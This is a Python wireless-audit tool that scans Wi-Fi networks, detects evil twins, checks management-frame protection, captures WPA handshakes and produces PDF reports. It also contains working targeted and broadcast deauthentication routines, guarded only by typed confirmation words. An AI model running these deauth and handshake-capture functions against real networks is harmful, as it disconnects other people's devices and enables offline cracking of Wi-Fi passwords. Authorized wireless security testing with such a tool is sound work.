#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║       PriVi Wireless Command Center (PWCC) v1.0                  ║
║       RF Intelligence & Wireless Audit Platform                  ║
║       Developed by Prince Ubebe | PriViSecurity                  ║
╚══════════════════════════════════════════════════════════════════╝

LEGAL NOTICE:
  This tool is intended ONLY for use on wireless networks you own
  or have explicit written authorization to audit. Deauthentication
  testing against networks you do not own is illegal under the
  Computer Misuse Act, CFAA, and equivalent laws worldwide.
  PriViSecurity accepts no liability for unauthorized use.
"""

import sys, subprocess, importlib

def _auto_install():
    """Auto-install missing dependencies. Works on live Kali, VM, and fresh installs."""
    packages = {
        "fpdf": "fpdf2",
        "scapy": "scapy",
        "rich": "rich",
    }
    missing = []
    for import_name, pip_name in packages.items():
        try:
            importlib.import_module(import_name)
        except ImportError:
            missing.append(pip_name)
    if missing:
        print(f"[PriViSecurity] Installing missing packages: {', '.join(missing)}")
        subprocess.check_call([
            sys.executable, "-m", "pip", "install",
            "--break-system-packages", "-q",
            *missing
        ])
        print("[PriViSecurity] Done. Launching tool...\n")

_auto_install()


import threading
import time
import os
import sys
import re
from datetime import datetime

from scapy.all import (
    Dot11, Dot11Beacon, Dot11Deauth, Dot11Elt, Dot11EltRSN,
    EAPOL, RadioTap, sendp, sniff
)
from rich.console import Console
from rich.table import Table as RichTable
from rich.live import Live
from rich.panel import Panel
from rich.layout import Layout
from rich.text import Text
from rich.prompt import Prompt, IntPrompt
from fpdf import FPDF
from fpdf.enums import XPos, YPos

# ── CONFIGURATION ─────────────────────────────────────────────────────────────

AUTHOR  = "Prince Ubebe"
BRAND   = "PriViSecurity"
VERSION = "4.0"
TOOL    = "PriVi Wireless Command Center"

console      = Console()
networks     = {}          # {BSSID: [SSID, Channel, Signal, MFP_Status]}
log_messages = []
stop_threads = False
captured_handshakes = []
_log_lock    = threading.Lock()


# ── AUTHORIZATION GATE ────────────────────────────────────────────────────────

def authorization_gate():
    os.system("clear")

    gate_text = Text()
    gate_text.append("\n  ⚠️  LEGAL AUTHORIZATION REQUIRED\n\n", style="bold red")
    gate_text.append(
        "  This tool performs active wireless security analysis including\n"
        "  passive surveillance, EAPOL capture, and deauthentication testing.\n\n",
        style="white"
    )
    gate_text.append("  You MUST have one of the following before proceeding:\n\n", style="white")
    gate_text.append("    ✔  You own the wireless network being audited, OR\n", style="green")
    gate_text.append("    ✔  You hold a signed Letter of Authorization (LoA)\n", style="green")
    gate_text.append("       from the network owner permitting this audit.\n\n", style="green")
    gate_text.append(
        "  Deauthentication attacks against networks you do not own are\n"
        "  illegal under the Computer Misuse Act, CFAA, and equivalent\n"
        "  cybercrime laws worldwide.\n\n",
        style="dim white"
    )
    gate_text.append("  PriViSecurity accepts NO liability for unauthorized use.\n\n", style="dim red")

    console.print(Panel(
        gate_text,
        border_style="red",
        title=f"[bold red]{TOOL} v{VERSION}[/bold red]"
    ))

    console.print("[bold white]Do you have written authorization to audit the target wireless network?[/bold white]")
    console.print("[dim]Type [bold green]AGREE[/bold green] to confirm and proceed, or press Ctrl+C to exit.[/dim]\n")

    try:
        response = input("  > ").strip()
    except KeyboardInterrupt:
        console.print("\n[bold yellow][!] Session cancelled.[/bold yellow]")
        sys.exit(0)

    if response != "AGREE":
        console.print("\n[bold red][!] Authorization not confirmed. Exiting.[/bold red]")
        sys.exit(0)

    console.print("\n[bold green][✔] Authorization confirmed. Proceeding.[/bold green]\n")
    time.sleep(1)


# ── DEAUTH AUTHORIZATION GATE ─────────────────────────────────────────────────

def deauth_authorization_gate(mode_name: str) -> bool:
    """
    Secondary gate specifically for deauthentication modes.
    Operator must explicitly confirm target network ownership/authorization.
    """
    console.print(Panel(
        f"\n  [bold red]⚠️  DEAUTH MODE WARNING[/bold red]\n\n"
        f"  You selected: [bold yellow]{mode_name}[/bold yellow]\n\n"
        f"  Deauthentication forcibly disconnects clients from a wireless\n"
        f"  network. This is [bold red]disruptive by design[/bold red] and must only be used on\n"
        f"  networks you own or have explicit written permission to test.\n\n"
        f"  Misuse against public or unauthorized networks is a criminal\n"
        f"  offence in most jurisdictions.\n",
        border_style="red",
        title="[bold red]Deauth Confirmation Required[/bold red]"
    ))

    console.print("[bold white]Confirm you are authorized to perform deauth testing on the target network.[/bold white]")
    console.print("[dim]Type [bold green]CONFIRM[/bold green] to proceed or any other key to cancel.[/dim]\n")

    try:
        response = input("  > ").strip()
    except KeyboardInterrupt:
        return False

    if response != "CONFIRM":
        console.print("\n[bold yellow][!] Deauth cancelled. Returning to passive mode.[/bold yellow]\n")
        return False

    console.print("\n[bold green][✔] Deauth authorization confirmed.[/bold green]\n")
    return True


# ── HEADER ────────────────────────────────────────────────────────────────────

def print_header():
    os.system("clear")
    header = Text()
    header.append(
        "\n"
        "  ██████╗ ██╗    ██╗ ██████╗ ██████╗\n"
        "  ██╔══██╗██║    ██║██╔════╝██╔════╝\n"
        "  ██████╔╝██║ █╗ ██║██║     ██║\n"
        "  ██╔═══╝ ██║███╗██║██║     ██║\n"
        "  ██║     ╚███╔███╔╝╚██████╗╚██████╗\n"
        "  ╚═╝      ╚══╝╚══╝  ╚═════╝ ╚═════╝\n",
        style="bold cyan"
    )
    header.append(
        f"  {BRAND}  |  {TOOL} v{VERSION}  |  RF Intelligence & Wireless Audit Platform\n",
        style="dim white"
    )
    header.append(f"  Developer: {AUTHOR}  |  Authorized Use Only\n", style="dim red")
    console.print(Panel(header, border_style="blue"))


# ── LOGGING ───────────────────────────────────────────────────────────────────

def update_logs(msg: str):
    with _log_lock:
        log_messages.append(f"[bold green]»[/bold green] {time.strftime('%H:%M:%S')} | {msg}")
        if len(log_messages) > 12:
            log_messages.pop(0)


# ── CHANNEL HOPPER ────────────────────────────────────────────────────────────

def channel_hopper(interface: str):
    while not stop_threads:
        for ch in range(1, 14):
            if stop_threads:
                break
            try:
                os.system(f"iwconfig {interface} channel {ch} > /dev/null 2>&1")
            except Exception:
                pass
            time.sleep(0.45)


# ── PACKET CALLBACK ───────────────────────────────────────────────────────────

def packet_callback(pkt, lab_ssid: str, lab_bssid: str):
    global networks

    # Beacon frames  -  network discovery
    if pkt.haslayer(Dot11Beacon):
        bssid = pkt[Dot11].addr2
        try:
            ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt[Dot11Elt].info else "Hidden"
        except Exception:
            ssid = "Hidden"

        # Evil twin detection
        if (lab_ssid and ssid == lab_ssid and
                lab_bssid and bssid.lower() != lab_bssid.lower()):
            update_logs(f"[bold red]⚠ EVIL TWIN DETECTED  -  BSSID: {bssid} | SSID: {ssid}[/bold red]")
            ssid = f"[bold red]{ssid} [!][/bold red]"

        # 802.11w MFP check
        mfp = "Disabled"
        if pkt.haslayer(Dot11EltRSN):
            try:
                cap = pkt[Dot11EltRSN].cap
                if cap & 0x40 or cap & 0x80:
                    mfp = "[bold green]Protected[/bold green]"
            except Exception:
                pass

        try:
            channel = pkt[Dot11Beacon].network_stats().get("channel", "?")
            signal  = pkt.dBm_AntSignal
        except Exception:
            channel, signal = "?", "?"

        networks[bssid] = [ssid, channel, signal, mfp]

    # EAPOL  -  handshake capture
    if pkt.haslayer(EAPOL):
        src = pkt[Dot11].addr3 if pkt.haslayer(Dot11) else "Unknown"
        update_logs(f"[bold magenta]EAPOL HANDSHAKE captured from {src}[/bold magenta]")
        captured_handshakes.append(pkt)


# ── DEAUTH FUNCTIONS ──────────────────────────────────────────────────────────

def targeted_deauth(interface: str, target_bssid: str, client_mac: str, count: int = 50):
    """
    Send deauth frames to a specific client on a specific AP.
    For use in authorized wireless penetration tests only.
    """
    update_logs(f"[yellow]Deauth: targeting {client_mac} on {target_bssid}[/yellow]")
    pkt = (
        RadioTap() /
        Dot11(addr1=client_mac, addr2=target_bssid, addr3=target_bssid) /
        Dot11Deauth(reason=7)
    )
    try:
        sendp(pkt, iface=interface, count=count, inter=0.1, verbose=False)
        update_logs(f"[green]Deauth complete: {count} frames sent to {client_mac}[/green]")
    except Exception as e:
        update_logs(f"[red]Deauth error: {e}[/red]")


def broadcast_deauth(interface: str, target_bssid: str, count: int = 50):
    """
    Send broadcast deauth frames to all clients on a specific AP.
    For use in authorized wireless penetration tests only.
    """
    update_logs(f"[yellow]Broadcast deauth on {target_bssid}[/yellow]")
    pkt = (
        RadioTap() /
        Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) /
        Dot11Deauth(reason=7)
    )
    try:
        sendp(pkt, iface=interface, count=count, inter=0.1, verbose=False)
        update_logs(f"[green]Broadcast deauth complete: {count} frames sent[/green]")
    except Exception as e:
        update_logs(f"[red]Deauth error: {e}[/red]")


# ── PDF REPORT ────────────────────────────────────────────────────────────────

class PWCCReport(FPDF):
    def header(self):
        self.set_fill_color(26, 26, 46)
        self.rect(0, 0, 210, 38, "F")
        self.set_xy(10, 8)
        self.set_font("Helvetica", "B", 18)
        self.set_text_color(255, 255, 255)
        self.cell(0, 10, "PriVi Wireless Audit Report",new_x=XPos.LMARGIN, new_y=YPos.NEXT)
        self.set_xy(10, 20)
        self.set_font("Helvetica", "", 10)
        self.set_text_color(180, 180, 180)
        self.cell(0, 8, f"PriViSecurity  |  {TOOL} v{VERSION}",new_x=XPos.LMARGIN, new_y=YPos.NEXT)
        self.ln(18)

    def footer(self):
        self.set_y(-14)
        self.set_font("Helvetica", "I", 8)
        self.set_text_color(150, 150, 150)
        self.cell(
            0, 10,
            f"Page {self.page_no()}   -   Confidential: Authorized Use Only   -   PriViSecurity",
            align="C"
        )

    def section_title(self, title: str):
        self.set_fill_color(196, 30, 58)
        self.set_text_color(255, 255, 255)
        self.set_font("Helvetica", "B", 11)
        self.cell(0, 9, f"  {title}", fill=True,new_x=XPos.LMARGIN, new_y=YPos.NEXT)
        self.set_text_color(0, 0, 0)
        self.ln(2)

    def clean(self, text: str) -> str:
        if not text:
            return ""
        text = re.sub(r"\[.*?\]", "", str(text))
        return text.encode("ascii", "ignore").decode("ascii").strip()


def generate_pdf_report(scan_data: dict, handshake_count: int,
                         mode_used: str, operator: dict = None) -> str:
    if not scan_data:
        return None

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename  = f"PWCC_Wireless_Audit_{timestamp}.pdf"

    pdf = PWCCReport()
    pdf.add_page()

    # Summary
    pdf.section_title("1. Audit Summary")
    pdf.set_font("Helvetica", "", 10)
    pdf.set_text_color(40, 40, 40)

    rows = [
        ("Conducted by", (operator or {}).get("name", "Operator") + (f"  |  {operator['org']}" if operator and operator.get("org") else "")),
        ("Tool",             f"{TOOL} v{VERSION}"),
        ("Audit Date",       datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
        ("Audit Mode",       mode_used),
        ("Networks Found",   str(len(scan_data))),
        ("EAPOL Handshakes", str(handshake_count)),
    ]
    for k, v in rows:
        pdf.set_font("Helvetica", "B", 9)
        pdf.cell(50, 7, f"  {k}:",new_x=XPos.RIGHT, new_y=YPos.TOP)
        pdf.set_font("Helvetica", "", 9)
        pdf.cell(0, 7, v,new_x=XPos.LMARGIN, new_y=YPos.NEXT)
    pdf.ln(4)

    # Network table
    pdf.section_title("2. Detected Networks")
    pdf.set_font("Helvetica", "B", 8)
    pdf.set_fill_color(26, 26, 46)
    pdf.set_text_color(255, 255, 255)
    pdf.cell(45, 8, "  BSSID",        fill=True,new_x=XPos.RIGHT, new_y=YPos.TOP)
    pdf.cell(65, 8, "SSID",           fill=True,new_x=XPos.RIGHT, new_y=YPos.TOP)
    pdf.cell(15, 8, "CH",             fill=True,new_x=XPos.RIGHT, new_y=YPos.TOP, align="C")
    pdf.cell(20, 8, "Signal",         fill=True,new_x=XPos.RIGHT, new_y=YPos.TOP, align="C")
    pdf.cell(0,  8, "802.11w (MFP)",  fill=True,new_x=XPos.LMARGIN, new_y=YPos.NEXT,  align="C")

    pdf.set_font("Helvetica", "", 8)
    pdf.set_text_color(0, 0, 0)
    alt = False
    for bssid, info in scan_data.items():
        if alt:
            pdf.set_fill_color(240, 240, 250)
        else:
            pdf.set_fill_color(255, 255, 255)
        alt = not alt

        ssid   = pdf.clean(info[0])
        ch     = pdf.clean(str(info[1]))
        sig    = pdf.clean(str(info[2]))
        mfp    = pdf.clean(info[3])
        mfp_display = "Protected" if "Protected" in mfp else "Disabled"

        pdf.cell(45, 7, f"  {bssid}",    fill=True,new_x=XPos.RIGHT, new_y=YPos.TOP)
        pdf.cell(65, 7, ssid[:30],        fill=True,new_x=XPos.RIGHT, new_y=YPos.TOP)
        pdf.cell(15, 7, ch,               fill=True,new_x=XPos.RIGHT, new_y=YPos.TOP, align="C")
        pdf.cell(20, 7, f"{sig} dBm",     fill=True,new_x=XPos.RIGHT, new_y=YPos.TOP, align="C")
        pdf.cell(0,  7, mfp_display,      fill=True,new_x=XPos.LMARGIN, new_y=YPos.NEXT,  align="C")
    pdf.ln(4)

    # Security observations
    pdf.section_title("3. Security Observations")
    pdf.set_font("Helvetica", "", 9)

    unprotected = [b for b, i in scan_data.items() if "Protected" not in i[3]]
    evil_twins  = [b for b, i in scan_data.items() if "[!]" in str(i[0])]

    if evil_twins:
        pdf.set_text_color(196, 30, 58)
        pdf.set_font("Helvetica", "B", 9)
        pdf.cell(0, 7, f"  [!] EVIL TWIN DETECTED: {', '.join(evil_twins)}",new_x=XPos.LMARGIN, new_y=YPos.NEXT)
        pdf.set_font("Helvetica", "", 9)
        pdf.set_text_color(40, 40, 40)
        pdf.multi_cell(
            0, 6,
            "  A network was detected with the monitored SSID but a different BSSID. "
            "This may indicate a rogue access point (evil twin) attempting to intercept traffic."
        )
        pdf.ln(2)

    if unprotected:
        pdf.set_text_color(40, 40, 40)
        pdf.multi_cell(
            0, 6,
            f"  {len(unprotected)} network(s) detected without 802.11w Management Frame Protection (MFP). "
            "Networks without MFP are vulnerable to deauthentication attacks and rogue AP spoofing."
        )
        pdf.ln(2)

    if handshake_count > 0:
        pdf.multi_cell(
            0, 6,
            f"  {handshake_count} EAPOL handshake(s) captured. These can be used for offline "
            "WPA/WPA2 passphrase analysis in authorized assessments."
        )
        pdf.ln(2)

    if not evil_twins and not unprotected and handshake_count == 0:
        pdf.cell(0, 7, "  No significant security observations during this session.",new_x=XPos.LMARGIN, new_y=YPos.NEXT)
    pdf.ln(4)

    # Recommendations
    pdf.section_title("4. Recommendations")
    pdf.set_font("Helvetica", "", 9)
    recs = [
        "Enable 802.11w (Management Frame Protection) on all access points to prevent "
        "deauthentication-based attacks. Set MFP to 'Required' for WPA3 networks.",
        "Monitor for unauthorized SSIDs matching your network name. Deploy wireless IDS "
        "solutions to detect evil twin and rogue AP activity.",
        "Use WPA3 where possible. WPA2-only networks remain vulnerable to PMKID and "
        "handshake-based offline attacks.",
        "Restrict wireless network access via MAC filtering (as a secondary control) "
        "and implement 802.1X (RADIUS) authentication for enterprise environments.",
        "Regularly audit wireless infrastructure for rogue APs, unauthorized clients, "
        "and misconfigured security settings.",
    ]
    for i, rec in enumerate(recs, 1):
        pdf.multi_cell(0, 6, f"  {i}. {rec}")
        pdf.ln(1)

    # Legal
    pdf.add_page()
    pdf.section_title("5. Legal & Scope Declaration")
    pdf.set_font("Helvetica", "", 9)
    pdf.multi_cell(
        0, 6,
        f"This report was generated by {TOOL} v{VERSION}, developed by {AUTHOR} / {BRAND}. "
        "The tool was used under the explicit authorization acknowledgment confirmed by the "
        "operator at session start.\n\n"
        "This report is confidential and intended solely for the authorized recipient. "
        f"Conducted by: {(operator or {}).get('name', 'Operator')}"
        + (f"  |  {operator['org']}" if operator and operator.get('org') else "") +
        "\n\nRedistribution without consent of the network owner is prohibited.\n\n"
        f"{BRAND} accepts no liability for actions taken based on the findings in this report "
        "without appropriate change-control, testing, and professional review."
    )

    pdf.output(filename)
    return filename


# ── MODE HANDLERS ─────────────────────────────────────────────────────────────

def run_passive_surveillance(interface: str, lab_ssid: str, lab_bssid: str):
    """Mode 1  -  Passive RF surveillance. Read-only, no transmission."""
    update_logs("Passive surveillance active. Channel hopping started.")

    layout = Layout()
    layout.split_column(
        Layout(name="header", size=4),
        Layout(name="table",  size=16),
        Layout(name="log",    size=10),
    )
    layout["header"].update(Panel(
        f"[bold cyan]Mode: Passive Surveillance[/bold cyan]  |  "
        f"Interface: [green]{interface}[/green]  |  "
        f"[dim white]PriViSecurity[/dim white]",
        border_style="blue"
    ))

    with Live(layout, refresh_per_second=2, screen=True):
        while not stop_threads:
            table = RichTable(
                title="[bold cyan]RF Spectrum  -  Detected Networks[/bold cyan]",
                expand=True, border_style="blue", show_lines=True
            )
            table.add_column("BSSID",    style="yellow", width=20)
            table.add_column("SSID",     style="white",  width=25)
            table.add_column("CH",       style="green",  width=5)
            table.add_column("Signal",   style="magenta",width=8)
            table.add_column("802.11w",  style="cyan",   width=14)

            for bssid, info in list(networks.items()):
                table.add_row(
                    bssid,
                    str(info[0]),
                    str(info[1]),
                    f"{info[2]} dBm",
                    str(info[3]),
                )

            layout["table"].update(table)
            with _log_lock:
                layout["log"].update(Panel(
                    "\n".join(log_messages[-10:]),
                    title="[bold green]Intelligence Stream[/bold green]",
                    border_style="green"
                ))
            time.sleep(1)


def run_handshake_hunt(interface: str, lab_ssid: str, lab_bssid: str):
    """Mode 2  -  EAPOL handshake capture. Passive, read-only."""
    update_logs("Handshake hunt mode active. Monitoring for EAPOL frames.")
    run_passive_surveillance(interface, lab_ssid, lab_bssid)


def run_targeted_deauth(interface: str):
    """Mode 3  -  Targeted deauth. Secondary authorization required."""
    if not deauth_authorization_gate("Targeted Deauth  -  Single Client"):
        return

    console.print("\n[bold white]Targeted Deauth Configuration[/bold white]\n")
    target_bssid = Prompt.ask("[cyan]Target AP BSSID[/cyan]  (e.g. AA:BB:CC:DD:EE:FF)").strip()
    client_mac   = Prompt.ask("[cyan]Client MAC[/cyan]       (e.g. 11:22:33:44:55:66)").strip()
    count        = IntPrompt.ask("[cyan]Frame count[/cyan]", default=50)

    update_logs(f"Targeted deauth: {client_mac} -> {target_bssid} ({count} frames)")
    targeted_deauth(interface, target_bssid, client_mac, count)
    console.print("\n[bold green][✔] Deauth sequence complete.[/bold green]")


def run_broadcast_deauth(interface: str):
    """Mode 4  -  Broadcast deauth. Secondary authorization required."""
    if not deauth_authorization_gate("Broadcast Deauth  -  All Clients on AP"):
        return

    console.print("\n[bold white]Broadcast Deauth Configuration[/bold white]\n")
    target_bssid = Prompt.ask("[cyan]Target AP BSSID[/cyan]  (e.g. AA:BB:CC:DD:EE:FF)").strip()
    count        = IntPrompt.ask("[cyan]Frame count[/cyan]", default=50)

    update_logs(f"Broadcast deauth on {target_bssid} ({count} frames)")
    broadcast_deauth(interface, target_bssid, count)
    console.print("\n[bold green][✔] Broadcast deauth complete.[/bold green]")


# ── MAIN ──────────────────────────────────────────────────────────────────────


def get_operator_info() -> dict:
    """
    Prompt for operator name and organization.
    Appears in the PDF report as "Conducted by".
    PriViSecurity brand and Prince Ubebe developer credit
    remain fixed in the report header — always.
    """
    console.print(Panel(
        "\n  [bold white]Operator Details[/bold white]\n\n"
        "  These will appear in the PDF report footer.\n"
        "  [dim]PriViSecurity branding stays fixed in the header.[/dim]\n",
        border_style="blue",
        title="[bold cyan]Report Configuration[/bold cyan]"
    ))
    op_name = console.input(
        "  [cyan]Your name[/cyan]          (analyst conducting this audit): "
    ).strip()
    op_org = console.input(
        "  [cyan]Organization[/cyan]       (optional, press Enter to skip):  "
    ).strip()
    if not op_name:
        op_name = "Operator"
    return {"name": op_name, "org": op_org}

def main():
    global stop_threads

    # Root check
    if os.getuid() != 0:
        console.print("[bold red][!] PWCC requires root privileges. Run with sudo.[/bold red]")
        sys.exit(1)

    authorization_gate()
    print_header()
    operator = get_operator_info()

    # Interface config
    console.print("[bold white]Interface Configuration[/bold white]\n")
    interface = Prompt.ask("[cyan]Monitor-mode interface[/cyan]", default="wlan0mon")
    lab_ssid  = Prompt.ask("[cyan]Your lab/authorized SSID (for evil twin detection)[/cyan]", default="")
    lab_bssid = Prompt.ask("[cyan]Your lab/authorized BSSID (leave blank to skip)[/cyan]", default="")

    # Mode menu
    console.print()
    mode_table = RichTable(border_style="blue", show_lines=True, title="[bold cyan]Audit Modes[/bold cyan]")
    mode_table.add_column("No.", style="bold cyan", width=5)
    mode_table.add_column("Mode",        style="bold white", width=30)
    mode_table.add_column("Type",        style="white",      width=12)
    mode_table.add_column("Description", style="dim white")

    mode_table.add_row("1", "Passive Surveillance",        "Read-only",  "Channel hopping, network discovery, evil twin detection")
    mode_table.add_row("2", "EAPOL Handshake Capture",     "Read-only",  "Monitor for WPA/WPA2 handshakes during auth events")
    mode_table.add_row("3", "Targeted Deauth Test",        "Active ⚠",  "Deauth a specific client from a specific AP (requires extra auth)")
    mode_table.add_row("4", "Broadcast Deauth Test",       "Active ⚠",  "Deauth all clients from a specific AP (requires extra auth)")

    console.print(mode_table)
    console.print()

    mode = Prompt.ask("[cyan]Select audit mode[/cyan]", choices=["1", "2", "3", "4"])

    # Start sniff + channel hop for passive modes
    if mode in ("1", "2"):
        threading.Thread(
            target=channel_hopper, args=(interface,), daemon=True
        ).start()

        sniff_thread = threading.Thread(
            target=lambda: sniff(
                iface=interface,
                prn=lambda pkt: packet_callback(pkt, lab_ssid, lab_bssid),
                store=0
            ),
            daemon=True
        )
        sniff_thread.start()

    try:
        if mode == "1":
            run_passive_surveillance(interface, lab_ssid, lab_bssid)
        elif mode == "2":
            run_handshake_hunt(interface, lab_ssid, lab_bssid)
        elif mode == "3":
            run_targeted_deauth(interface)
        elif mode == "4":
            run_broadcast_deauth(interface)

    except KeyboardInterrupt:
        pass
    finally:
        stop_threads = True
        console.print("\n[bold yellow][!] Session terminated.[/bold yellow]")

        if networks:
            console.print("\n[bold cyan][*] Generating audit report...[/bold cyan]")
            mode_labels = {
                "1": "Passive Surveillance",
                "2": "EAPOL Handshake Capture",
                "3": "Targeted Deauth Test",
                "4": "Broadcast Deauth Test",
            }
            try:
                fname = generate_pdf_report(
                    networks,
                    len(captured_handshakes),
                    mode_labels.get(mode, "Unknown"),
                    operator
                )
                if fname:
                    console.print(f"[bold green][+] Report saved: {fname}[/bold green]")
                else:
                    console.print("[yellow][!] No data to report.[/yellow]")
            except Exception as e:
                console.print(f"[bold red][!] PDF generation failed: {e}[/bold red]")
        else:
            console.print("[bold white][!] No networks captured. Skipping report.[/bold white]")

        console.print("\n[bold green][✔] PWCC session closed. PriViSecurity standing by.[/bold green]\n")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        console.print("\n[bold yellow][!] Exit requested.[/bold yellow]")
        sys.exit(0)
